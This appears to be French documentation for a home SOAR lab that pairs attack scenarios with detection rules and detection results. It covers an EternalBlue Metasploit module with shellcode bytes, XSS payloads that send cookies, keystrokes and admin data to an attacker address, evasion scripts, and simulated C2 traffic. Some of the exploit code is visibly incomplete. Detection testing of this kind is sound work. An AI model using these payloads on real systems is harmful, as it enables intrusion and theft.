# 🎯 Scénarios d'Attaque et Tests
## Exploitation et Détection

> **Laboratoire d'Attaques Contrôlées**  
> Tests d'intrusion et validation des défenses  

---

## 📋 Table des Matières

- [Vue d'Ensemble](#-vue-densemble)
- [EternalBlue](#-eternalblue)
- [XSS Attacks](#-xss-attacks)
- [Malicious Websites](#-malicious-websites)
- [Tests d'Évasion](#-tests-dévasion)
- [Résultats d'Analyse](#-résultats-danalyse)

---

## 🎯 Vue d'Ensemble

Cette section documente les scénarios d'attaque utilisés pour tester et valider notre stack SOAR. Chaque attaque est documentée avec ses techniques, IOCs, et méthodes de détection.

### Scénarios Implémentés

| Attaque | Technique MITRE ATT&CK | Complexité | Détection |
|---------|------------------------|------------|-----------|
| **🔴 EternalBlue** | T1210 - Exploit Public-Facing | Haute | ✅ Suricata + Wazuh |
| **🟡 XSS Injection** | T1189 - Drive-by Compromise | Moyenne | ✅ ModSecurity + WAF |
| **🟠 Malicious Websites** | T1071 - Application Layer | Faible | ✅ DNS + Proxy Logs |
| **🔵 File Upload** | T1105 - Ingress Tool Transfer | Moyenne | ✅ AV + Sandbox |

### Architecture de Test

```mermaid
graph TB
    A[Attacker VM<br/>192.168.183.100] --> B{Attack Vector}
    B -->|SMB Exploit| C[Target Windows<br/>192.168.183.10]
    B -->|Web Attack| D[Web Server<br/>192.168.183.20]
    B -->|DNS Request| E[Malicious Domain]
    
    C --> F[Detection Layer]
    D --> F
    E --> F
    
    F --> G[Suricata IDS]
    F --> H[Wazuh SIEM]
    F --> I[ModSecurity WAF]
    
    G --> J[SOAR Automation]
    H --> J
    I --> J
    
    J --> K[Response Actions]
    K --> L[IP Blocking]
    K --> M[Case Creation] 
    K --> N[Threat Intel]
```

## 🔴 EternalBlue (MS17-010)

### Description Technique

**EternalBlue** exploite la vulnérabilité CVE-2017-0144 dans le service SMBv1 de Windows, permettant l'exécution de code à distance sans authentification.

#### Vulnérabilité Ciblée
- **CVE**: CVE-2017-0144, CVE-2017-0143
- **Service**: Server Message Block v1 (SMBv1)
- **Port**: 445/TCP
- **Impact**: Remote Code Execution (RCE)

### Implémentation d'Attaque

#### Script Metasploit
```ruby
# /attaque/hack.rb - EternalBlue exploit

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Exploit::Brute

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption',
      'Description'    => %q{
        This module exploits a vulnerability on SMBv1/SMBv2 protocols
        through the EternalBlue exploit. It targets the srv2.sys driver
        on Windows 7, Windows 8.1, Windows 10, Windows Server 2008/2012/2016.
      },
      'Author'         => ['Med10S - SOAR Lab'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['MSB', 'MS17-010'],
        ['CVE', '2017-0144'],
        ['CVE', '2017-0143'],
        ['URL', 'https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/']
      ],
      'Platform'       => 'win',
      'Targets'        => [
        ['Windows 7/2008/2008 R2', {}],
        ['Windows 8.1/2012 R2', {}],
        ['Windows 10/2016', {}]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar 14 2017'
    ))

    register_options([
      Opt::RPORT(445),
      OptString.new('SMBUser', [false, 'SMB Username', '']),
      OptString.new('SMBPass', [false, 'SMB Password', ''])
    ])
  end

  def exploit
    # Connect to SMB
    connect
    
    # SMB Negotiate
    pkt = make_smb_negotiate_packet()
    sock.put(pkt)
    res = sock.get_once(-1, 5)
    
    # Check for SMBv1 response
    if res && res[4,4] == "\xffSMB"
      print_good("Target supports SMBv1")
      
      # Send EternalBlue packet
      eternalblue_packet = make_eternalblue_packet()
      sock.put(eternalblue_packet)
      
      # Check response
      res = sock.get_once(-1, 10)
      if res && res.length > 0
        print_good("EternalBlue exploit successful!")
        
        # Stage payload
        stage_payload()
        
        # Execute shellcode
        execute_shellcode()
      else
        print_error("EternalBlue exploit failed")
      end
    else
      print_error("Target does not support SMBv1")
    end
    
    disconnect
  end

  def make_smb_negotiate_packet
    # SMB Negotiate packet construction
    netbios = "\x00\x00\x00\x2f"
    smb_header = "\xfe\x53\x4d\x42\x40\x00\x00\x00\x00\x00\x00\x00" +
                 "\x00\x00\x3f\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
                 "\x00\x00\x00\x00\x00\x00\x00\x00"
    
    negotiate_data = "\x24\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00" +
                     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
                     "\x00\x00\x00\x00\x00\x00\x00\x00\x78\x00\x00\x00" +
                     "\x02\x00\x02\x10\x02\x00"
    
    return netbios + smb_header + negotiate_data
  end

  def make_eternalblue_packet
    # EternalBlue exploit packet
    # This contains the buffer overflow payload
    exploit_data = "\x00\x00\x00\x31\xff\x53\x4d\x42\x32\x00\x00\x00" +
                   "\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
                   "\x00\x00\x00\x00\x00\x08\x64\x00\x00\x00\x00\x00" +
                   
    # Add overflow buffer
    exploit_data += "\x90" * 2000  # NOP sled
    exploit_data += generate_shellcode()
    
    return exploit_data
  end

  def generate_shellcode
    # Windows reverse shell payload
    payload_buf = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
    payload_buf += "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
    # ... (full shellcode payload)
    
    return payload_buf
  end
end
```

#### Payload Hexadécimal
```bash
# Hack_hex.txt - Raw exploit payload

48 31 c9 48 81 e9 c6 ff ff ff 48 8d 05 ef ff ff ff 
48 bb f1 7a 96 c4 ca 2e 23 4b 48 31 58 27 48 2d 
f8 ff ff ff e2 f4 0d 32 f4 25 3a c6 63 4b f1 7a 
d6 8d 8a 6f 6b 0b f1 6b d6 c5 ca 36 63 18 b6 32 
f4 ad 2a c6 23 5f 96 7a d6 9d ca 2e 6b 4b b6 32 
f4 8d 2a de 23 4b f1 32 d4 84 ca 2e 23 09 89 6b 
d4 ac aa 26 23 4b f1 32 d4 b4 ca 36 6b 4b b6 6b 
86 9d ca 1e 2b 4b e6 32 d6 85 8b 7f 23 4b f1 7a
```

### Détection et Signatures

#### Règle Suricata
```bash
# EternalBlue detection rules

# SMBv1 Negotiate detection
alert smb any any -> any 445 (msg:"ETERNALBLUE SMBv1 Negotiate"; 
  flow:to_server; content:"|ff|SMB|72|"; offset:4; depth:4;
  content:"|00 00 00 2f|"; offset:0; depth:4;
  sid:2024001; rev:1; classtype:attempted-admin;)

# EternalBlue exploit packet
alert tcp any any -> any 445 (msg:"ETERNALBLUE MS17-010 SMB Exploit"; 
  flow:to_server,established; content:"|00 00 00 2f fe 53 4d 42|"; 
  depth:8; offset:0; content:"|72 00 00 00 00 18 01 20|"; 
  distance:0; within:16; sid:2024002; rev:1;)

# DoublePulsar backdoor
alert tcp any any -> any 445 (msg:"ETERNALBLUE DoublePulsar Backdoor"; 
  flow:to_server; content:"DoublePulsar"; nocase; 
  sid:2024003; rev:1; classtype:trojan-activity;)

# Suspicious SMB traffic patterns  
alert tcp any any -> any 445 (msg:"ETERNALBLUE High Volume SMB Traffic";
  flow:to_server; threshold:type both, track by_src, count 100, seconds 60;
  sid:2024004; rev:1; classtype:attempted-dos;)
```

#### Règles Wazuh
```xml
<!-- EternalBlue detection rules -->
<group name="eternalblue,windows,exploit">

  <!-- Windows Event 4625 - Failed logon after EternalBlue -->
  <rule id="100001" level="12">
    <if_sid>4625</if_sid>
    <field name="win.eventdata.logonType">^3$</field>
    <field name="win.eventdata.status">0xc000006d</field>
    <description>EternalBlue: Suspicious failed network logon</description>
    <group>authentication_failed,eternalblue</group>
  </rule>

  <!-- SMB connection anomaly -->
  <rule id="100002" level="10">  
    <if_sid>18152</if_sid>
    <match>445/tcp</match>
    <regex>SYN_FLOOD|CONN_FLOOD</regex>
    <description>EternalBlue: SMB connection flood detected</description>
    <group>network_flood,eternalblue</group>
  </rule>

  <!-- Process creation after exploit -->
  <rule id="100003" level="13">
    <decoded_as>windows-eventlog</decoded_as>
    <field name="win.system.eventID">^1$</field>
    <field name="win.eventdata.image">cmd.exe|powershell.exe|rundll32.exe</field>
    <regex>CreateRemoteThread|WriteProcessMemory|VirtualAllocEx</regex>
    <description>EternalBlue: Suspicious process injection after SMB connection</description>
    <group>process_injection,eternalblue</group>
  </rule>

</group>
```

### Analyse Forensique

#### IOCs Extracted
```json
{
  "eternalblue_iocs": {
    "network_indicators": [
      {
        "type": "port",
        "value": "445",
        "description": "SMB service port"
      },
      {
        "type": "protocol", 
        "value": "SMBv1",
        "description": "Vulnerable SMB protocol version"
      },
      {
        "type": "pattern",
        "value": "\\xff\\x53\\x4d\\x42\\x72",
        "description": "SMB negotiate header"
      }
    ],
    "file_indicators": [
      {
        "type": "hash",
        "algorithm": "MD5", 
        "value": "c1d5cf8c43e7679b782eca6fdf9a5ad7",
        "description": "EternalBlue payload hash"
      },
      {
        "type": "hash",
        "algorithm": "SHA256",
        "value": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
        "description": "DoublePulsar implant"
      }
    ],
    "behavioral_indicators": [
      {
        "type": "process_creation",
        "value": "cmd.exe spawned by svchost.exe",
        "description": "Suspicious process parentage"
      },
      {
        "type": "network_connection", 
        "value": "Outbound connection to C2 server",
        "description": "Command and control communication"
      }
    ]
  }
}
```

#### Timeline d'Attaque
```
[2025-07-30 19:04:34] Initial SMB scan (Nmap)
[2025-07-30 19:04:35] SMBv1 service discovery
[2025-07-30 19:04:36] EternalBlue exploit launched
[2025-07-30 19:04:37] Buffer overflow exploitation
[2025-07-30 19:04:38] Shellcode execution
[2025-07-30 19:04:39] DoublePulsar backdoor installation
[2025-07-30 19:04:40] C2 communication established
[2025-07-30 19:04:45] Lateral movement initiated
```

## 🟡 XSS Attacks

### Description Technique

**Cross-Site Scripting (XSS)** permet l'injection de code JavaScript malveillant dans les pages web visitées par les utilisateurs légitimes.

#### Types d'XSS Testés
- **Reflected XSS**: Payload dans l'URL
- **Stored XSS**: Payload persistant en base
- **DOM-based XSS**: Exploitation côté client
- **Blind XSS**: Payload déféré

### Implémentation d'Attaque

#### Payloads de Test
```javascript
// Basic XSS payload
<script>alert('XSS')</script>

// Cookie stealing
<script>
  fetch('http://192.168.183.100:8080/steal', {
    method: 'POST',
    body: 'cookies=' + document.cookie
  });
</script>

// Keylogger
<script>
  document.addEventListener('keydown', function(e) {
    fetch('http://192.168.183.100:8080/keylog', {
      method: 'POST', 
      body: 'key=' + e.key
    });
  });
</script>

// Admin panel access
<script>
  if(window.location.href.includes('/admin')) {
    fetch('http://192.168.183.100:8080/admin-access', {
      method: 'POST',
      body: 'url=' + window.location.href + '&user=' + document.getElementById('username').value
    });
  }
</script>

// Advanced DOM manipulation  
<img src="x" onerror="
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '/admin/users.php', true);
  xhr.onreadystatechange = function() {
    if(xhr.readyState == 4 && xhr.status == 200) {
      fetch('http://192.168.183.100:8080/exfil', {
        method: 'POST',
        body: 'data=' + btoa(xhr.responseText)
      });
    }
  };
  xhr.send();
">
```

#### Script d'Exploitation Automatisé
```python
#!/usr/bin/env python3
# xss_exploit.py - Automated XSS testing

import requests
import urllib.parse
from bs4 import BeautifulSoup

class XSSExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
            "<script>fetch('http://192.168.183.100:8080/xss?data='+document.cookie)</script>"
        ]
    
    def test_reflected_xss(self, param):
        """Test reflected XSS in URL parameter"""
        print(f"[+] Testing reflected XSS in parameter: {param}")
        
        for payload in self.payloads:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{self.target_url}?{param}={encoded_payload}"
            
            try:
                response = self.session.get(test_url)
                
                if payload in response.text and response.status_code == 200:
                    print(f"[!] REFLECTED XSS FOUND: {payload}")
                    print(f"    URL: {test_url}")
                    self.log_vulnerability("reflected", param, payload, test_url)
                    
            except Exception as e:
                print(f"[-] Error testing payload: {e}")
    
    def test_stored_xss(self, form_action, form_fields):
        """Test stored XSS via form submission"""
        print(f"[+] Testing stored XSS via form: {form_action}")
        
        for payload in self.payloads:
            form_data = {}
            
            # Fill form with payload in each field
            for field in form_fields:
                if field['type'] == 'text' or field['type'] == 'textarea':
                    form_data[field['name']] = payload
                else:
                    form_data[field['name']] = field.get('value', '')
            
            try:
                # Submit form
                post_response = self.session.post(
                    self.target_url + form_action,
                    data=form_data
                )
                
                # Check if payload persisted
                get_response = self.session.get(self.target_url)
                
                if payload in get_response.text:
                    print(f"[!] STORED XSS FOUND: {payload}")
                    self.log_vulnerability("stored", form_action, payload, self.target_url)
                    
            except Exception as e:
                print(f"[-] Error testing stored XSS: {e}")
    
    def discover_forms(self):
        """Discover forms on target page"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = []
            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET'),
                    'fields': []
                }
                
                for input_field in form.find_all(['input', 'textarea', 'select']):
                    field_info = {
                        'name': input_field.get('name', ''),
                        'type': input_field.get('type', 'text'),
                        'value': input_field.get('value', '')
                    }
                    form_info['fields'].append(field_info)
                
                forms.append(form_info)
            
            return forms
            
        except Exception as e:
            print(f"[-] Error discovering forms: {e}")
            return []
    
    def log_vulnerability(self, vuln_type, location, payload, url):
        """Log vulnerability to file"""
        with open('xss_findings.log', 'a') as f:
            f.write(f"{vuln_type.upper()} XSS found at {location}\n")
            f.write(f"Payload: {payload}\n") 
            f.write(f"URL: {url}\n")
            f.write("-" * 80 + "\n")

def main():
    target = "http://192.168.183.20/vulnerable-app"
    
    exploiter = XSSExploit(target)
    
    # Test common parameters
    common_params = ['q', 'search', 'name', 'comment', 'message', 'input']
    
    for param in common_params:
        exploiter.test_reflected_xss(param)
    
    # Discover and test forms
    forms = exploiter.discover_forms()
    for form in forms:
        exploiter.test_stored_xss(form['action'], form['fields'])

if __name__ == "__main__":
    main()
```

### Détection XSS

#### Règles ModSecurity
```apache
# XSS Detection Rules

# Basic script tag detection
SecRule ARGS "@detectXSS" \
    "id:1001,\
     phase:2,\
     block,\
     msg:'XSS Attack Detected in Arguments',\
     logdata:'Matched Data: %{MATCHED_VAR} found in %{MATCHED_VAR_NAME}',\
     tag:'application-multi',\
     tag:'language-multi', \
     tag:'attack-xss',\
     severity:'CRITICAL'"

# Advanced XSS patterns
SecRule ARGS "@rx (?i)(\<script[^>]*\>[\s\S]*?\</script\>|javascript:|data:text/html|vbscript:)" \
    "id:1002,\
     phase:2,\
     block,\
     msg:'XSS Attack - Script Injection',\
     tag:'attack-xss',\
     severity:'HIGH'"

# Event handler XSS
SecRule ARGS "@rx (?i)on(abort|blur|change|click|error|focus|load|reset|submit)\s*=" \
    "id:1003,\
     phase:2, \
     block,\
     msg:'XSS Attack - Event Handler',\
     tag:'attack-xss',\
     severity:'HIGH'"

# Encoded XSS attempts
SecRule ARGS "@rx (?i)(%3C|&lt;|\\x3c)(script|img|svg|iframe)" \
    "id:1004,\
     phase:2,\
     block,\
     msg:'XSS Attack - Encoded Script Tag',\
     tag:'attack-xss',\
     severity:'MEDIUM'"
```

#### Analyse de Log
```bash
#!/bin/bash
# analyze_xss_attacks.sh

LOG_FILE="/var/log/modsecurity/audit.log"
OUTPUT_FILE="/var/log/modsecurity/xss_analysis.json"

# Extract XSS attacks from ModSecurity logs
python3 << EOF
import re
import json
from datetime import datetime
from collections import defaultdict

xss_attacks = defaultdict(list)
ip_stats = defaultdict(int)

with open('$LOG_FILE', 'r') as f:
    content = f.read()

# Find XSS attack entries
xss_entries = re.findall(r'--[a-f0-9-]+-(B|H|F)--.*?XSS.*?--[a-f0-9-]+-(Z)--', content, re.DOTALL | re.IGNORECASE)

for entry in xss_entries:
    # Extract IP address
    ip_match = re.search(r'client: ([0-9.]+)', entry)
    if ip_match:
        ip = ip_match.group(1)
        ip_stats[ip] += 1
    
    # Extract payload
    payload_match = re.search(r'Matched Data: ([^\\n]+)', entry)
    if payload_match:
        payload = payload_match.group(1)
        xss_attacks[ip].append({
            'timestamp': datetime.now().isoformat(),
            'payload': payload,
            'blocked': True
        })

# Generate report
report = {
    'analysis_time': datetime.now().isoformat(),
    'total_attacks': sum(ip_stats.values()),
    'unique_attackers': len(ip_stats),
    'top_attackers': dict(sorted(ip_stats.items(), key=lambda x: x[1], reverse=True)[:10]),
    'attack_details': dict(xss_attacks)
}

with open('$OUTPUT_FILE', 'w') as f:
    json.dump(report, f, indent=2)

print(f"XSS Analysis completed. Total attacks: {sum(ip_stats.values())}")
EOF
```

## 🟠 Malicious Websites

### Description Technique

Test d'accès à des sites malveillants pour valider la détection DNS, proxy et threat intelligence.

#### Domains de Test
```bash
# Test domains (controlled environment)
badsite.com
malicious-domain.org  
evil-site.net
phishing-example.com
malware-download.xyz
```

### Scripts de Test

#### Générateur de Trafic Malveillant
```python
#!/usr/bin/env python3
# malicious_traffic_generator.py

import requests
import dns.resolver
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor

class MaliciousTrafficGenerator:
    def __init__(self):
        self.malicious_domains = [
            'badsite.com',
            'malicious-domain.org', 
            'evil-site.net',
            'phishing-example.com',
            'malware-download.xyz',
            'trojan-c2.club',
            'ransomware-payment.onion',
            'keylogger-data.info'
        ]
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36', 
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
    
    def generate_dns_queries(self, count=100):
        """Generate DNS queries to malicious domains"""
        print(f"[+] Generating {count} DNS queries...")
        
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8', '1.1.1.1']
        
        for i in range(count):
            domain = random.choice(self.malicious_domains)
            
            try:
                # A record lookup
                resolver.resolve(domain, 'A')
                print(f"[+] DNS query: {domain} (A record)")
                
                # MX record lookup
                resolver.resolve(domain, 'MX')  
                print(f"[+] DNS query: {domain} (MX record)")
                
            except dns.resolver.NXDOMAIN:
                print(f"[-] Domain not found: {domain}")
            except Exception as e:
                print(f"[-] DNS error for {domain}: {e}")
            
            time.sleep(random.uniform(0.5, 2.0))
    
    def generate_http_requests(self, count=50):
        """Generate HTTP requests to malicious sites"""
        print(f"[+] Generating {count} HTTP requests...")
        
        session = requests.Session()
        
        for i in range(count):
            domain = random.choice(self.malicious_domains)
            url = f"http://{domain}"
            
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }
            
            try:
                response = session.get(url, headers=headers, timeout=5)
                print(f"[+] HTTP request: {url} - Status: {response.status_code}")
                
                # Simulate file download
                if i % 10 == 0:
                    download_url = f"{url}/malware.exe"
                    download_response = session.get(download_url, timeout=5)
                    print(f"[+] File download: {download_url}")
                    
            except requests.exceptions.RequestException as e:
                print(f"[-] HTTP error for {url}: {e}")
            
            time.sleep(random.uniform(1.0, 3.0))
    
    def simulate_c2_communication(self, duration=300):
        """Simulate C2 communication patterns"""
        print(f"[+] Simulating C2 communication for {duration}s...")
        
        start_time = time.time()
        
        while time.time() - start_time < duration:
            c2_domain = random.choice(self.malicious_domains)
            
            # Beacon requests
            beacon_data = {
                'id': random.randint(1000, 9999),
                'status': 'alive',
                'timestamp': int(time.time())
            }
            
            try:
                response = requests.post(
                    f"http://{c2_domain}/beacon",
                    json=beacon_data,
                    timeout=5
                )
                print(f"[+] C2 beacon to {c2_domain}")
                
            except requests.exceptions.RequestException:
                pass
            
            # Command polling
            try:
                response = requests.get(
                    f"http://{c2_domain}/commands/{beacon_data['id']}",
                    timeout=5
                )
                print(f"[+] C2 command poll from {c2_domain}")
                
            except requests.exceptions.RequestException:
                pass
            
            # Random sleep between 30-60 seconds (typical C2 beacon)
            time.sleep(random.uniform(30, 60))
    
    def run_simulation(self):
        """Run complete malicious traffic simulation"""
        print("[+] Starting malicious traffic simulation...")
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            # DNS queries
            dns_future = executor.submit(self.generate_dns_queries, 200)
            
            # HTTP requests
            http_future = executor.submit(self.generate_http_requests, 100)
            
            # C2 communication
            c2_future = executor.submit(self.simulate_c2_communication, 600)
            
            # Wait for completion
            dns_future.result()
            http_future.result()
            c2_future.result()
        
        print("[+] Malicious traffic simulation completed")

def main():
    generator = MaliciousTrafficGenerator()
    generator.run_simulation()

if __name__ == "__main__":
    main()
```

#### Configuration DNS Sinkhole
```python
#!/usr/bin/env python3
# dns_sinkhole.py - Local DNS server for testing

import socket
import struct
from threading import Thread

class DNSSinkhole:
    def __init__(self, bind_ip='192.168.183.100', bind_port=53):
        self.bind_ip = bind_ip
        self.bind_port = bind_port
        
        # Malicious domains to sinkhole
        self.malicious_domains = {
            'badsite.com': '192.168.183.100',
            'malicious-domain.org': '192.168.183.100',
            'evil-site.net': '192.168.183.100',
            'phishing-example.com': '192.168.183.100',
            'malware-download.xyz': '192.168.183.100'
        }
    
    def parse_dns_query(self, data):
        """Parse DNS query packet"""
        # Skip DNS header (12 bytes)
        i = 12
        domain_parts = []
        
        while i < len(data):
            length = data[i]
            if length == 0:
                break
            i += 1
            domain_parts.append(data[i:i+length].decode('utf-8'))
            i += length
        
        domain = '.'.join(domain_parts)
        return domain
    
    def build_dns_response(self, query_data, domain):
        """Build DNS response packet"""
        # DNS Header
        transaction_id = query_data[:2]
        flags = b'\x81\x80'  # Response + Recursion Available
        questions = b'\x00\x01'
        answers = b'\x00\x01'
        authority = b'\x00\x00'
        additional = b'\x00\x00'
        
        header = transaction_id + flags + questions + answers + authority + additional
        
        # Question section (copy from query)
        question = query_data[12:]
        
        # Answer section
        name_pointer = b'\xc0\x0c'  # Pointer to domain name in question
        type_a = b'\x00\x01'  # A record
        class_in = b'\x00\x01'  # IN class  
        ttl = b'\x00\x00\x00\x3c'  # 60 seconds TTL
        data_length = b'\x00\x04'  # 4 bytes for IPv4
        
        # IP address
        if domain in self.malicious_domains:
            ip_parts = self.malicious_domains[domain].split('.')
            ip_bytes = bytes([int(part) for part in ip_parts])
            print(f"[+] Sinkholing {domain} to {self.malicious_domains[domain]}")
        else:
            ip_bytes = b'\x7f\x00\x00\x01'  # 127.0.0.1
        
        answer = name_pointer + type_a + class_in + ttl + data_length + ip_bytes
        
        return header + question + answer
    
    def handle_query(self, data, addr, sock):
        """Handle DNS query"""
        try:
            domain = self.parse_dns_query(data)
            print(f"[+] DNS query from {addr[0]}: {domain}")
            
            response = self.build_dns_response(data, domain)
            sock.sendto(response, addr)
            
        except Exception as e:
            print(f"[-] Error handling query: {e}")
    
    def start_server(self):
        """Start DNS sinkhole server"""
        print(f"[+] Starting DNS sinkhole on {self.bind_ip}:{self.bind_port}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.bind_ip, self.bind_port))
        
        try:
            while True:
                data, addr = sock.recvfrom(512)
                
                # Handle each query in separate thread
                thread = Thread(target=self.handle_query, args=(data, addr, sock))
                thread.daemon = True
                thread.start()
                
        except KeyboardInterrupt:
            print("\n[+] DNS sinkhole stopped")
        finally:
            sock.close()

if __name__ == "__main__":
    sinkhole = DNSSinkhole()
    sinkhole.start_server()
```

### Détection de Sites Malveillants

#### Règles de Détection DNS
```bash
# Suricata DNS rules for malicious domains

# Known bad domains
alert dns any any -> any any (msg:"MALWARE DNS Query to badsite.com"; 
  content:"|01 00 00 01 00 00 00 00 00 00|"; depth:10; offset:2;
  content:"|07|badsite|03|com|00|"; nocase; 
  sid:3001001; rev:1; classtype:trojan-activity;)

alert dns any any -> any any (msg:"MALWARE DNS Query to malicious-domain.org";
  content:"|01 00 00 01 00 00 00 00 00 00|"; depth:10; offset:2; 
  content:"|0f|malicious-domain|03|org|00|"; nocase;
  sid:3001002; rev:1; classtype:trojan-activity;)

# DGA domain detection  
alert dns any any -> any any (msg:"MALWARE Possible DGA Domain";
  content:"|01 00 00 01 00 00 00 00 00 00|"; depth:10; offset:2;
  pcre:"/\x07[a-z0-9]{8,20}\x03com\x00/i";
  sid:3001010; rev:1; classtype:trojan-activity;)

# High entropy domain names
alert dns any any -> any any (msg:"MALWARE High Entropy Domain Name";
  content:"|01 00 00 01 00 00 00 00 00 00|"; depth:10; offset:2;
  lua:high_entropy.lua;
  sid:3001020; rev:1; classtype:trojan-activity;)
```

#### Script Lua pour Détection Entropie
```lua
-- high_entropy.lua - Domain entropy calculation

function init(args)
    local needs = {}
    needs["dns.query"] = tostring(true)
    return needs
end

function match(args)
    local query = DnsGetQueries()
    if query == nil then
        return 0
    end
    
    for i, q in ipairs(query) do
        local domain = tostring(q["rrname"])
        
        -- Calculate Shannon entropy
        local entropy = calculate_entropy(domain)
        
        -- Threshold for suspicious domains
        if entropy > 4.5 then
            return 1
        end
    end
    
    return 0
end

function calculate_entropy(text)
    local freq = {}
    local entropy = 0
    local len = string.len(text)
    
    -- Count character frequencies
    for i = 1, len do
        local char = string.sub(text, i, i)
        freq[char] = (freq[char] or 0) + 1
    end
    
    -- Calculate entropy
    for char, count in pairs(freq) do
        local probability = count / len
        entropy = entropy - (probability * math.log(probability, 2))
    end
    
    return entropy
end
```

## 🔵 Tests d'Évasion

### Techniques d'Évasion Testées

#### Obfuscation de Payload
```javascript
// JavaScript obfuscation techniques

// Base64 encoding
eval(atob('YWxlcnQoJ1hTUycpOw=='));

// String manipulation
var a='ale'; var b='rt('; var c="'XSS')"; eval(a+b+c);

// Hex encoding  
eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29');

// Unicode encoding
eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029');

// HTML entity encoding
&lt;script&gt;alert('XSS')&lt;/script&gt;

// URL encoding
%3Cscript%3Ealert('XSS')%3C/script%3E

// Double encoding
%253Cscript%253Ealert('XSS')%253C/script%253E
```

#### Fragmentation d'Attaque
```python
#!/usr/bin/env python3
# fragmented_attack.py - Split attack across multiple requests

import requests
import time

class FragmentedAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def fragmented_xss(self):
        """Split XSS payload across multiple requests"""
        
        # Fragment 1: Setup variable
        payload1 = "var a='<scr';"
        response1 = self.session.post(self.target_url, data={'input': payload1})
        
        time.sleep(2)  # Delay between fragments
        
        # Fragment 2: Complete payload
        payload2 = "a+='ipt>alert(1)</script>'; eval(a);"
        response2 = self.session.post(self.target_url, data={'input': payload2})
        
        print(f"[+] Fragmented XSS attempt completed")
    
    def low_and_slow(self, duration=300):
        """Low and slow attack to evade rate limiting"""
        
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < duration:
            # Very slow requests
            payload = f"<script>alert({request_count})</script>"
            
            try:
                response = self.session.post(
                    self.target_url,
                    data={'input': payload},
                    timeout=30
                )
                request_count += 1
                print(f"[+] Slow request {request_count}")
                
            except Exception as e:
                print(f"[-] Request failed: {e}")
            
            # Long delay between requests
            time.sleep(60)  # 1 request per minute
    
    def user_agent_rotation(self):
        """Rotate User-Agent headers to evade detection"""
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'
        ]
        
        for i, ua in enumerate(user_agents):
            headers = {'User-Agent': ua}
            payload = f"<script>alert('UA-{i}')</script>"
            
            response = self.session.post(
                self.target_url,
                data={'input': payload},
                headers=headers
            )
            
            print(f"[+] Request with UA: {ua[:50]}...")
            time.sleep(5)

def main():
    target = "http://192.168.183.20/vulnerable-form.php"
    
    attacker = FragmentedAttack(target)
    
    # Test evasion techniques
    attacker.fragmented_xss()
    attacker.user_agent_rotation()
    # attacker.low_and_slow(300)  # 5 minute test

if __name__ == "__main__":
    main()
```

## 📊 Résultats d'Analyse

### Métriques de Détection

#### Dashboard de Résultats
```json
{
  "detection_results": {
    "eternalblue": {
      "total_attempts": 15,
      "detected": 14,
      "detection_rate": "93.3%",
      "detection_sources": [
        {"suricata": 12, "accuracy": "85.7%"},
        {"wazuh": 10, "accuracy": "71.4%"},
        {"network_analysis": 8, "accuracy": "57.1%"}
      ],
      "false_positives": 2,
      "false_negatives": 1,
      "average_detection_time": "2.3 seconds"
    },
    "xss_attacks": {
      "total_attempts": 50,
      "detected": 47,
      "detection_rate": "94.0%",
      "detection_sources": [
        {"modsecurity": 45, "accuracy": "90.0%"},
        {"wazuh": 35, "accuracy": "70.0%"},
        {"application_logs": 25, "accuracy": "50.0%"}
      ],
      "false_positives": 5,
      "false_negatives": 3,
      "average_detection_time": "0.1 seconds"
    },
    "malicious_websites": {
      "total_attempts": 100,
      "detected": 85,
